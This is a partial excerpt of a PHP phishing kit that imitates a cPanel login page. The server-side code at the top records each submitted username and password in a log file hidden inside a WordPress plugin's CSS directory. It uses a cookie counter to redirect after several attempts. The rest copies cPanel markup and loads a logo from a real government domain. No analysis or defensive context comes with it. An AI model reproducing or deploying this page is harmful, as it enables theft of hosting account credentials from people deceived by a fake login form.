...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cook_time = time() + (86400 * 7);
    $user = $_POST["user"];
    $pass = $_POST["pass"];

    if (!empty($user) && !empty($pass)) {
        if (!isset($_COOKIE["alfa_fakepage_counter16973"])) {
            setcookie("alfa_fakepage_counter16973", 0, $cook_time, "/");
            $_COOKIE["alfa_fakepage_counter16973"] = 1;
        }
        if ((int)$_COOKIE["alfa_fakepage_counter16973"] > 3) {
            header("Location: /");
            exit;
        }

        setcookie("alfa_fakepage_counter16973", ((int)$_COOKIE["alfa_fakepage_counter16973"] + 1), $cook_time, "/");
        $fp = fopen("/home2/pntanjun/public_html/assets/plugins/wp-whatsapp/assets/dist/css/log.txt", "a+");
        fwrite($fp, $user . " : " . $pass . "\n");
        fclose($fp);
        sleep(3);
        ...
        if (empty($user)) {
            ...
            echo json_encode(array("message" => "no_username"));
        } else {
...
.copyright {
  ...
  background-size: 25px auto;
    ...
    <style type="text/css">
        img {
            behavior: url(/cPanel_magic_revision_1638282076/unprotected/cp_pngbehavior_login.htc);
        }
    </style>
    <![endif]-->
    ...
    <div id="notify">
        <noscript>
            <div class="error-notice">
                <img src="/cPanel_magic_revision_1638200223/unprotected/cpanel/images/notice-error.png" alt="Error" align="left"/>
            ...
            <div id="locale-inner-container">
                ...
                <div id="locale-map">
                    <div class="scroller clear">
                            ...
                            <div class="locale-cell"><a href="?locale=es_es">español de España</a></div><div class="locale-cell"><a href="?locale=fi">suomi</a></div>
        ...
        <div id="login-container">
            ...
            <div id="login-sub-container">
                    <div id="login-sub-header">
                        ...
                        <img class="main-logo" src="https://niasbaratkab.go.id:2083///cPanel_magic_revision_1638200223/unprotected/cpanel/images/cpanel-logo.svg" alt="logo" alt="logo" />
                    ...
                    <div id="login-sub"
                        ...
                        <div id="forms">
                            <form novalidate id="login_form" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" target="_top" style="visibility:">
        ...
        <!--CLOSE login-container -->
            ...
            <div class="locale-container">
                ...
                <ul id="locales_list">
                        ...
                        <li><a href="/?locale=cs">čeština</a></li><li><a href="/?locale=da">dansk</a></li>
